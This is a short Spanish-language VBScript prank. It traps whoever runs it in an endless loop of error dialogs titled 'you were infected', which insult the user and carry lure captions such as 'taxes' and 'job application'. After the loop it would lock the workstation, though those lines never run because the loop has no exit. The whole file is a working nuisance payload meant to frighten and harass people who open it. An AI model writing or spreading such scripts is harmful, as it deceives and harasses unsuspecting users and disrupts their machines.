Do
    X=MsgBox("PENDEJO, ABRISTE LO QUE NO DEBIAS",0+16,"FUISTE INFECTADO")
    X=MsgBox("IMPUESTOS",0+16,"FUISTE INFECTADO")
    X=MsgBox("SOLICITUD DE EMPLEO",0+16,"FUISTE INFECTADO")
    X=MsgBox("JAJA PUTO",0+16,"FUISTE INFECTADO")
Loop

Dim shell
Set shell = CreateObject("WScript.Shell")

X = MsgBox("Chao puto", 0 + 16, "Aviso")

shell.Run "rundll32.exe user32.dll,LockWorkStation"